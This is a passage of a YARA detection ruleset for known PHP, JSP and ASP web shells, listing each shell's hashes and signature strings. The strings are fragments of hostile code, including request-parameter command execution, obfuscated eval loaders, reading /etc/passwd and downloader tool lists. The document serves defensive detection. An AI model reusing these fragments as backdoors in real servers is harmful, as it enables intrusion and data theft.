		$s9 = "if  ( ( (isset($http_auth_user) ) && (isset($http_auth_pass)) ) && ( !isset("
	condition:
		2 of them
}
rule webshell_PHP_g00nv13 {
	meta:
		description = "Web Shell - file g00nv13.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "35ad2533192fe8a1a76c3276140db820"
	strings:
		$s1 = "case \"zip\": case \"tar\": case \"rar\": case \"gz\": case \"cab\": cas"
		$s4 = "if(!($sqlcon = @mysql_connect($_SESSION['sql_host'] . ':' . $_SESSION['sql_p"
	condition:
		all of them
}
rule webshell_php_h6ss {
	meta:
		description = "Web Shell - file h6ss.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "272dde9a4a7265d6c139287560328cd5"
	strings:
		$s0 = "<?php eval(gzuncompress(base64_decode(\""
	condition:
		all of them
}
rule webshell_jsp_zx {
	meta:
		description = "Web Shell - file zx.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "67627c264db1e54a4720bd6a64721674"
	strings:
		$s0 = "if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application.g"
	condition:
		all of them
}
rule webshell_Ani_Shell {
	meta:
		description = "Web Shell - file Ani-Shell.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "889bfc9fbb8ee7832044fc575324d01a"
	strings:
		$s0 = "$Python_CODE = \"I"
		$s6 = "$passwordPrompt = \"\\n================================================="
		$s7 = "fputs ($sockfd ,\"\\n==============================================="
	condition:
		1 of them
}
rule webshell_jsp_k8cmd {
	meta:
		description = "Web Shell - file k8cmd.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "b39544415e692a567455ff033a97a682"
	strings:
		$s2 = "if(request.getSession().getAttribute(\"hehe\").toString().equals(\"hehe\"))" fullword
	condition:
		all of them
}
rule webshell_jsp_cmd {
	meta:
		description = "Web Shell - file cmd.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "5391c4a8af1ede757ba9d28865e75853"
	strings:
		$s6 = "out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");" fullword
	condition:
		all of them
}
rule webshell_jsp_k81 {
	meta:
		description = "Web Shell - file k81.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "41efc5c71b6885add9c1d516371bd6af"
	strings:
		$s1 = "byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);" fullword
		$s9 = "if(cmd.equals(\"Szh0ZWFt\")){out.print(\"[S]\"+dir+\"[E]\");}" fullword
	condition:
		1 of them
}
rule webshell_ASP_zehir {
	meta:
		description = "Web Shell - file zehir.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "0061d800aee63ccaf41d2d62ec15985d"
	strings:
		$s9 = "Response.Write \"<font face=wingdings size=3><a href='\"&dosyaPath&\"?status=18&"
	condition:
		all of them
}
rule webshell_Worse_Linux_Shell {
	meta:
		description = "Web Shell - file Worse Linux Shell.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "8338c8d9eab10bd38a7116eb534b5fa2"
	strings:
		$s0 = "system(\"mv \".$_FILES['_upl']['tmp_name'].\" \".$currentWD"
	condition:
		all of them
}
rule webshell_zacosmall {
	meta:
		description = "Web Shell - file zacosmall.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "5295ee8dc2f5fd416be442548d68f7a6"
	strings:
		$s0 = "if($cmd!==''){ echo('<strong>'.htmlspecialchars($cmd).\"</strong><hr>"
	condition:
		all of them
}
rule webshell_Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit {
	meta:
		description = "Web Shell - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "c6eeacbe779518ea78b8f7ed5f63fc11"
	strings:
		$s1 = "<option value=\"cat /etc/passwd\">/etc/passwd</option>" fullword
	condition:
		all of them
}
rule webshell_redirect {
	meta:
		description = "Web Shell - file redirect.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "97da83c6e3efbba98df270cc70beb8f8"
	strings:
		$s7 = "var flag = \"?txt=\" + (document.getElementById(\"dl\").checked ? \"2\":\"1\" "
	condition:
		all of them
}
rule webshell_jsp_cmdjsp {
	meta:
		description = "Web Shell - file cmdjsp.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "b815611cc39f17f05a73444d699341d4"
	strings:
		$s5 = "<FORM METHOD=GET ACTION='cmdjsp.jsp'>" fullword
	condition:
		all of them
}
rule webshell_Java_Shell {
	meta:
		description = "Web Shell - file Java Shell.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "36403bc776eb12e8b7cc0eb47c8aac83"
	strings:
		$s4 = "public JythonShell(int columns, int rows, int scrollback) {" fullword
		$s9 = "this(null, Py.getSystemState(), columns, rows, scrollback);" fullword
	condition:
		1 of them
}
rule webshell_asp_1d {
	meta:
		description = "Web Shell - file 1d.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "fad7504ca8a55d4453e552621f81563c"
	strings:
		$s0 = "+9JkskOfKhUxZJPL~\\(mD^W~[,{@#@&EO"
	condition:
		all of them
}
rule webshell_jsp_IXRbE {
	meta:
		description = "Web Shell - file IXRbE.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "e26e7e0ebc6e7662e1123452a939e2cd"
	strings:
		$s0 = "<%if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application"
	condition:
		all of them
}
rule webshell_PHP_G5 {
	meta:
		description = "Web Shell - file G5.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "95b4a56140a650c74ed2ec36f08d757f"
	strings:
		$s3 = "echo \"Hacking Mode?<br><select name='htype'><option >--------SELECT--------</op"
	condition:
		all of them
}
rule webshell_PHP_r57142 {
	meta:
		description = "Web Shell - file r57142.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "0911b6e6b8f4bcb05599b2885a7fe8a8"
	strings:
		$s0 = "$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');" fullword
	condition:
		all of them
}
rule webshell_jsp_tree {
	meta:
		description = "Web Shell - file tree.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "bcdf7bbf7bbfa1ffa4f9a21957dbcdfa"
	strings:
		$s5 = "$('#tt2').tree('options').url = \"selectChild.action?checki"
		$s6 = "String basePath = request.getScheme()+\"://\"+request.getServerName()+\":\"+requ"
	condition:
		all of them
}
rule webshell_C99madShell_v_3_0_smowu {
	meta:
		description = "Web Shell - file smowu.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "74e1e7c7a6798f1663efb42882b85bee"
	strings:
		$s2 = "<tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Enter ::</b><for"
		$s8 = "<p><font color=red>Wordpress Not Found! <input type=text id=\"wp_pat\"><input ty"
	condition:
		1 of them
}
rule webshell_simple_backdoor {
	meta:
		description = "Web Shell - file simple-backdoor.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "f091d1b9274c881f8e41b2f96e6b9936"
	strings:
		$s0 = "$cmd = ($_REQUEST['cmd']);" fullword
		$s1 = "if(isset($_REQUEST['cmd'])){" fullword
		$s4 = "system($cmd);" fullword
	condition:
		2 of them
}
rule webshell_PHP_404 {
	meta:
		description = "Web Shell - file 404.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "078c55ac475ab9e028f94f879f548bca"
	strings:
		$s4 = "<span>Posix_getpwuid (\"Read\" /etc/passwd)"
	condition:
		all of them
}
rule webshell_Macker_s_Private_PHPShell {
	meta:
		description = "Web Shell - file Macker's Private PHPShell.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "e24cbf0e294da9ac2117dc660d890bb9"
	strings:
		$s3 = "echo \"<tr><td class=\\\"silver border\\\">&nbsp;<strong>Server's PHP Version:&n"
		$s4 = "&nbsp;&nbsp;<?php echo buildUrl(\"<font color=\\\"navy\\\">["
		$s7 = "echo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type="
	condition:
		all of them
}
rule webshell_Antichat_Shell_v1_3_2 {
	meta:
		description = "Web Shell - file Antichat Shell v1.3.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "40d0abceba125868be7f3f990f031521"
	strings:
		$s3 = "$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - Antichat Shell</title><m"
	condition:
		all of them
}
rule webshell_Safe_mode_breaker {
	meta:
		description = "Web Shell - file Safe mode breaker.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "5bd07ccb1111950a5b47327946bfa194"
	strings:
		$s5 = "preg_match(\"/SAFE\\ MODE\\ Restriction\\ in\\ effect\\..*whose\\ uid\\ is("
		$s6 = "$path =\"{$root}\".((substr($root,-1)!=\"/\") ? \"/\" : NULL)."
	condition:
		1 of them
}
rule webshell_Sst_Sheller {
	meta:
		description = "Web Shell - file Sst-Sheller.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "d93c62a0a042252f7531d8632511ca56"
	strings:
		$s2 = "echo \"<a href='?page=filemanager&id=fm&fchmod=$dir$file'>"
		$s3 = "<? unlink($filename); unlink($filename1); unlink($filename2); unlink($filename3)"
	condition:
		all of them
}
rule webshell_jsp_list {
	meta:
		description = "Web Shell - file list.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "1ea290ff4259dcaeb680cec992738eda"
	strings:
		$s0 = "<FORM METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">" fullword
		$s2 = "out.print(\") <A Style='Color: \" + fcolor.toString() + \";' HRef='?file=\" + fn"
		$s7 = "if(flist[i].canRead() == true) out.print(\"r\" ); else out.print(\"-\");" fullword
	condition:
		all of them
}
rule webshell_PHPJackal_v1_5 {
	meta:
		description = "Web Shell - file PHPJackal v1.5.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "d76dc20a4017191216a0315b7286056f"
	strings:
		$s7 = "echo \"<center>${t}MySQL cilent:</td><td bgcolor=\\\"#333333\\\"></td></tr><form"
		$s8 = "echo \"<center>${t}Wordlist generator:</td><td bgcolor=\\\"#333333\\\"></td></tr"
	condition:
		all of them
}
rule webshell_customize {
	meta:
		description = "Web Shell - file customize.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "d55578eccad090f30f5d735b8ec530b1"
	strings:
		$s4 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z"
	condition:
		all of them
}
rule webshell_s72_Shell_v1_1_Coding {
	meta:
		description = "Web Shell - file s72 Shell v1.1 Coding.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "c2e8346a5515c81797af36e7e4a3828e"
	strings:
		$s5 = "<font face=\"Verdana\" style=\"font-size: 8pt\" color=\"#800080\">Buradan Dosya "
	condition:
		all of them
}
rule webshell_jsp_sys3 {
	meta:
		description = "Web Shell - file sys3.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "b3028a854d07674f4d8a9cf2fb6137ec"
	strings:
		$s1 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">" fullword
		$s4 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\""
		$s9 = "<%@page contentType=\"text/html;charset=gb2312\"%>" fullword
	condition:
		all of them
}
rule webshell_jsp_guige02 {
	meta:
		description = "Web Shell - file guige02.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "a3b8b2280c56eaab777d633535baf21d"
	strings:
		$s0 = "????????????????%><html><head><title>hahahaha</title></head><body bgcolor=\"#fff"
		$s1 = "<%@page contentType=\"text/html; charset=GBK\" import=\"java.io.*;\"%><%!private"
	condition:
		all of them
}
rule webshell_php_ghost {
	meta:
		description = "Web Shell - file ghost.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "38dc8383da0859dca82cf0c943dbf16d"
	strings:
		$s1 = "<?php $OOO000000=urldecode('%61%68%36%73%62%65%68%71%6c%61%34%63%6f%5f%73%61%64'"
		$s6 = "//<img width=1 height=1 src=\"http://websafe.facaiok.com/just7z/sx.asp?u=***.***"
		$s7 = "preg_replace('\\'a\\'eis','e'.'v'.'a'.'l'.'(KmU(\"" fullword
	condition:
		all of them
}
rule webshell_WinX_Shell {
	meta:
		description = "Web Shell - file WinX Shell.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "17ab5086aef89d4951fe9b7c7a561dda"
	strings:
		$s5 = "print \"<font face=\\\"Verdana\\\" size=\\\"1\\\" color=\\\"#990000\\\">Filenam"
		$s8 = "print \"<font face=\\\"Verdana\\\" size=\\\"1\\\" color=\\\"#990000\\\">File: </"
	condition:
		all of them
}
rule webshell_Crystal_Crystal {
	meta:
		description = "Web Shell - file Crystal.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "fdbf54d5bf3264eb1c4bff1fac548879"
	strings:
		$s1 = "show opened ports</option></select><input type=\"hidden\" name=\"cmd_txt\" value"
		$s6 = "\" href=\"?act=tools\"><font color=#CC0000 size=\"3\">Tools</font></a></span></f"
	condition:
		all of them
}
rule webshell_r57_1_4_0 {
	meta:
		description = "Web Shell - file r57.1.4.0.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "574f3303e131242568b0caf3de42f325"
	strings:
		$s4 = "@ini_set('error_log',NULL);" fullword
		$s6 = "$pass='abcdef1234567890abcdef1234567890';" fullword
		$s7 = "@ini_restore(\"disable_functions\");" fullword
		$s9 = "@ini_restore(\"safe_mode_exec_dir\");" fullword
	condition:
		all of them
}
rule webshell_jsp_hsxa1 {
	meta:
		description = "Web Shell - file hsxa1.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "5686d5a38c6f5b8c55095af95c2b0244"
	strings:
		$s0 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%><jsp:directive.page import=\"ja"
	condition:
		all of them
}
rule webshell_asp_ajn {
	meta:
		description = "Web Shell - file ajn.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "aaafafc5d286f0bff827a931f6378d04"
	strings:
		$s1 = "seal.write \"Set WshShell = CreateObject(\"\"WScript.Shell\"\")\" & vbcrlf" fullword
		$s6 = "seal.write \"BinaryStream.SaveToFile \"\"c:\\downloaded.zip\"\", adSaveCreateOve"
	condition:
		all of them
}
rule webshell_php_cmd {
	meta:
		description = "Web Shell - file cmd.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "c38ae5ba61fd84f6bbbab98d89d8a346"
	strings:
		$s0 = "if($_GET['cmd']) {" fullword
		$s1 = "// cmd.php = Command Execution" fullword
		$s7 = "  system($_GET['cmd']);" fullword
	condition:
		all of them
}
rule webshell_asp_list {
	meta:
		description = "Web Shell - file list.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "1cfa493a165eb4b43e6d4cc0f2eab575"
	strings:
		$s0 = "<INPUT TYPE=\"hidden\" NAME=\"type\" value=\"<%=tipo%>\">" fullword
		$s4 = "Response.Write(\"<h3>FILE: \" & file & \"</h3>\")" fullword
	condition:
		all of them
}
rule webshell_PHP_co {
	meta:
		description = "Web Shell - file co.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "62199f5ac721a0cb9b28f465a513874c"
	strings:
		$s0 = "cGX6R9q733WvRRjISKHOp9neT7wa6ZAD8uthmVJV" fullword
		$s11 = "6Mk36lz/HOkFfoXX87MpPhZzBQH6OaYukNg1OE1j" fullword
	condition:
		all of them
}
rule webshell_PHP_150 {
	meta:
		description = "Web Shell - file 150.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "400c4b0bed5c90f048398e1d268ce4dc"
	strings:
		$s0 = "HJ3HjqxclkZfp"
		$s1 = "<? eval(gzinflate(base64_decode('" fullword
	condition:
		all of them
}
rule webshell_jsp_cmdjsp_2 {
	meta:
		description = "Web Shell - file cmdjsp.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "1b5ae3649f03784e2a5073fa4d160c8b"
	strings:
		$s0 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /C \" + cmd);" fullword
		$s4 = "<FORM METHOD=GET ACTION='cmdjsp.jsp'>" fullword
	condition:
		all of them
}
rule webshell_PHP_c37 {
	meta:
		description = "Web Shell - file c37.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "d01144c04e7a46870a8dd823eb2fe5c8"
	strings:
		$s3 = "array('cpp','cxx','hxx','hpp','cc','jxx','c++','vcproj'),"
		$s9 = "++$F; $File = urlencode($dir[$dirFILE]); $eXT = '.:'; if (strpos($dir[$dirFILE],"
	condition:
		all of them
}
rule webshell_PHP_b37 {
	meta:
		description = "Web Shell - file b37.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "0421445303cfd0ec6bc20b3846e30ff0"
	strings:
		$s0 = "xmg2/G4MZ7KpNveRaLgOJvBcqa2A8/sKWp9W93NLXpTTUgRc"
	condition:
		all of them
}
rule webshell_php_backdoor {
	meta:
		description = "Web Shell - file php-backdoor.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "2b5cb105c4ea9b5ebc64705b4bd86bf7"
	strings:
		$s1 = "if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fname))" fullword
		$s2 = "<pre><form action=\"<? echo $PHP_SELF; ?>\" METHOD=GET >execute command: <input "
	condition:
		all of them
}
rule webshell_asp_dabao {
	meta:
		description = "Web Shell - file dabao.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "3919b959e3fa7e86d52c2b0a91588d5d"
	strings:
		$s2 = " Echo \"<input type=button name=Submit onclick=\"\"document.location =&#039;\" &"
		$s8 = " Echo \"document.Frm_Pack.FileName.value=\"\"\"\"+year+\"\"-\"\"+(month+1)+\"\"-"
	condition:
		all of them
}
rule webshell_php_2 {
	meta:
		description = "Web Shell - file 2.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "267c37c3a285a84f541066fc5b3c1747"
	strings:
		$s0 = "<?php assert($_REQUEST[\"c\"]);?> " fullword
	condition:
		all of them
}
rule webshell_asp_cmdasp {
	meta:
		description = "Web Shell - file cmdasp.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "57b51418a799d2d016be546f399c2e9b"
	strings:
		$s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
		$s7 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword
	condition:
		all of them
}
rule webshell_spjspshell {
	meta:
		description = "Web Shell - file spjspshell.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "d39d51154aaad4ba89947c459a729971"
	strings:
		$s7 = "Unix:/bin/sh -c tar vxf xxx.tar Windows:c:\\winnt\\system32\\cmd.exe /c type c:"
	condition:
		all of them
}
rule webshell_jsp_action {
	meta:
		description = "Web Shell - file action.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "5a7d931094f5570aaf5b7b3b06c3d8c0"
	strings:
		$s1 = "String url=\"jdbc:oracle:thin:@localhost:1521:orcl\";" fullword
		$s6 = "<%@ page contentType=\"text/html;charset=gb2312\"%>" fullword
	condition:
		all of them
}
rule webshell_Inderxer {
	meta:
		description = "Web Shell - file Inderxer.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "9ea82afb8c7070817d4cdf686abe0300"
	strings:
		$s4 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input typ"
	condition:
		all of them
}
rule webshell_asp_Rader {
	meta:
		description = "Web Shell - file Rader.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "ad1a362e0a24c4475335e3e891a01731"
	strings:
		$s1 = "FONT-WEIGHT: bold; FONT-SIZE: 10px; BACKGROUND: none transparent scroll repeat 0"
		$s3 = "m\" target=inf onClick=\"window.open('?action=help','inf','width=450,height=400 "
	condition:
		all of them
}
rule webshell_c99_madnet_smowu {
	meta:
		description = "Web Shell - file smowu.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "3aaa8cad47055ba53190020311b0fb83"
	strings:
		$s0 = "//Authentication" fullword
		$s1 = "$login = \"" fullword
		$s2 = "eval(gzinflate(base64_decode('"
		$s4 = "//Pass" 
		$s4a = "$md5_pass = \"" 
		$s5 = "//If no pass then hash"
	condition:
		all of them
}
rule webshell_php_moon {
	meta:
		description = "Web Shell - file moon.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "2a2b1b783d3a2fa9a50b1496afa6e356"
	strings:
		$s2 = "echo '<option value=\"create function backshell returns string soname"
		$s3 = "echo      \"<input name='p' type='text' size='27' value='\".dirname(_FILE_).\""
		$s8 = "echo '<option value=\"select cmdshell(\\'net user "
	condition:
		2 of them
}
rule webshell_jsp_jdbc {
	meta:
		description = "Web Shell - file jdbc.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "23b0e6f91a8f0d93b9c51a2a442119ce"
	strings:
		$s4 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z"
	condition:
		all of them
}
rule webshell_minupload {
	meta:
		description = "Web Shell - file minupload.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "ec905a1395d176c27f388d202375bdf9"
	strings:
		$s0 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">   " fullword
		$s9 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859"
	condition:
		all of them
}
rule webshell_ELMALISEKER_Backd00r {
	meta:
		description = "Web Shell - file ELMALISEKER Backd00r.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "3aa403e0a42badb2c23d4a54ef43e2f4"
	strings:
		$s0 = "response.write(\"<tr><td bgcolor=#F8F8FF><input type=submit name=cmdtxtFileOptio"
		$s2 = "if FP = \"RefreshFolder\" or request.form(\"cmdOption\")=\"DeleteFolder\" or req"
	condition:
		all of them
}
rule webshell_PHP_bug_1_ {
	meta:
		description = "Web Shell - file bug (1).php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "91c5fae02ab16d51fc5af9354ac2f015"
	strings:
		$s0 = "@include($_GET['bug']);" fullword
	condition:
		all of them
}
rule webshell_caidao_shell_hkmjj {
	meta:
		description = "Web Shell - file hkmjj.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "e7b994fe9f878154ca18b7cde91ad2d0"
	strings:
		$s6 = "codeds=\"Li#uhtxhvw+%{{%,#@%{%#wkhq#hydo#uhtxhvw+%knpmm%,#hqg#li\"  " fullword
	condition:
		all of them
}
rule webshell_jsp_asd {
	meta:
		description = "Web Shell - file asd.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "a042c2ca64176410236fcc97484ec599"
	strings:
		$s3 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%>" fullword
		$s6 = "<input size=\"100\" value=\"<%=application.getRealPath(\"/\") %>\" name=\"url"
	condition:
		all of them
}
rule webshell_jsp_inback3 {
	meta:
		description = "Web Shell - file inback3.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "ea5612492780a26b8aa7e5cedd9b8f4e"
	strings:
		$s0 = "<%if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application"
	condition:
		all of them
}
rule webshell_metaslsoft {
	meta:
		description = "Web Shell - file metaslsoft.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "aa328ed1476f4a10c0bcc2dde4461789"
	strings:
		$s7 = "$buff .= \"<tr><td><a href=\\\"?d=\".$pwd.\"\\\">[ $folder ]</a></td><td>LINK</t"
	condition:
		all of them
}
rule webshell_asp_Ajan {
	meta:
		description = "Web Shell - file Ajan.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "b6f468252407efc2318639da22b08af0"
	strings:
		$s3 = "entrika.write \"BinaryStream.SaveToFile \"\"c:\\downloaded.zip\"\", adSaveCreate"
	condition:
		all of them
}
rule webshell_config_myxx_zend {
	meta:
		description = "Web Shell - from files config.jsp, myxx.jsp, zend.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "d44df8b1543b837e57cc8f25a0a68d92"
		hash1 = "e0354099bee243702eb11df8d0e046df"
		hash2 = "591ca89a25f06cf01e4345f98a22845c"
	strings:
		$s3 = ".println(\"<a href=\\\"javascript:alert('You Are In File Now ! Can Not Pack !');"
	condition:
		all of them
}
rule webshell_browser_201_3_ma_download {
	meta:
		description = "Web Shell - from files browser.jsp, 201.jsp, 3.jsp, ma.jsp, download.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "37603e44ee6dc1c359feb68a0d566f76"
		hash1 = "a7e25b8ac605753ed0c438db93f6c498"
		hash2 = "fb8c6c3a69b93e5e7193036fd31a958d"
		hash3 = "4cc68fa572e88b669bce606c7ace0ae9"
		hash4 = "fa87bbd7201021c1aefee6fcc5b8e25a"
	strings:
		$s2 = "<small>jsp File Browser version <%= VERSION_NR%> by <a"
		$s3 = "else if (fName.endsWith(\".mpg\") || fName.endsWith(\".mpeg\") || fName.endsWith"
	condition:
		all of them
}
rule webshell_itsec_itsecteam_shell_jHn {
	meta:
		description = "Web Shell - from files itsec.php, itsecteam_shell.php, jHn.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "8ae9d2b50dc382f0571cd7492f079836"
		hash1 = "bd6d3b2763c705a01cc2b3f105a25fa4"
		hash2 = "40c6ecf77253e805ace85f119fe1cebb"
	strings:
		$s4 = "echo $head.\"<font face='Tahoma' size='2'>Operating System : \".php_uname().\"<b"
		$s5 = "echo \"<center><form name=client method='POST' action='$_SERVER[PHP_SELF]?do=db'"
	condition:
		all of them
}
rule webshell_ghost_source_icesword_silic {
	meta:
		description = "Web Shell - from files ghost_source.php, icesword.php, silic.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "cbf64a56306c1b5d98898468fc1fdbd8"
		hash1 = "6e20b41c040efb453d57780025a292ae"
		hash2 = "437d30c94f8eef92dc2f064de4998695"
	strings:
		$s3 = "if(eregi('WHERE|LIMIT',$_POST['nsql']) && eregi('SELECT|FROM',$_POST['nsql'])) $"
		$s6 = "if(!empty($_FILES['ufp']['name'])){if($_POST['ufn'] != '') $upfilename = $_POST["
	condition:
		all of them
}
rule webshell_JspSpy_JspSpyJDK5_JspSpyJDK51_luci_jsp_spy2009_m_ma3_xxx {
	meta:
		description = "Web Shell - from files 000.jsp, 403.jsp, 807.jsp, a.jsp, c5.jsp, css.jsp, dm.jsp, he1p.jsp, JspSpy.jsp, JspSpyJDK5.jsp, JspSpyJDK51.jsp, luci.jsp.spy2009.jsp, m.jsp, ma3.jsp, mmym520.jsp, nogfw.jsp, ok.jsp, queryDong.jsp, spyjsp2010.jsp, style.jsp, t00ls.jsp, u.jsp, xia.jsp, cofigrue.jsp, 1.jsp, jspspy.jsp, jspspy_k8.jsp, JspSpy.jsp, JspSpyJDK5.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
		hash1 = "059058a27a7b0059e2c2f007ad4675ef"
		hash2 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
		hash3 = "76037ebd781ad0eac363d56fc81f4b4f"
		hash4 = "8b457934da3821ba58b06a113e0d53d9"
		hash5 = "fc44f6b4387a2cb50e1a63c66a8cb81c"
		hash6 = "14e9688c86b454ed48171a9d4f48ace8"
		hash7 = "b330a6c2d49124ef0729539761d6ef0b"
		hash8 = "d71716df5042880ef84427acee8b121e"
		hash9 = "341298482cf90febebb8616426080d1d"
		hash10 = "29aebe333d6332f0ebc2258def94d57e"
		hash11 = "42654af68e5d4ea217e6ece5389eb302"
		hash12 = "88fc87e7c58249a398efd5ceae636073"
		hash13 = "4a812678308475c64132a9b56254edbc"
		hash14 = "9626eef1a8b9b8d773a3b2af09306a10"
		hash15 = "344f9073576a066142b2023629539ebd"
		hash16 = "32dea47d9c13f9000c4c807561341bee"
		hash17 = "90a5ba0c94199269ba33a58bc6a4ad99"
		hash18 = "655722eaa6c646437c8ae93daac46ae0"
		hash19 = "b9744f6876919c46a29ea05b1d95b1c3"
		hash20 = "9c94637f76e68487fa33f7b0030dd932"
		hash21 = "6acc82544be056580c3a1caaa4999956"
		hash22 = "6aa32a6392840e161a018f3907a86968"
		hash23 = "349ec229e3f8eda0f9eb918c74a8bf4c"
		hash24 = "3ea688e3439a1f56b16694667938316d"
		hash25 = "ab77e4d1006259d7cbc15884416ca88c"
		hash26 = "71097537a91fac6b01f46f66ee2d7749"
		hash27 = "2434a7a07cb47ce25b41d30bc291cacc"
		hash28 = "7a4b090619ecce6f7bd838fe5c58554b"
	strings:
		$s8 = "\"<form action=\\\"\"+SHELL_NAME+\"?o=upload\\\" method=\\\"POST\\\" enctype="
		$s9 = "<option value='reg query \\\"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\T"
	condition:
		all of them
}
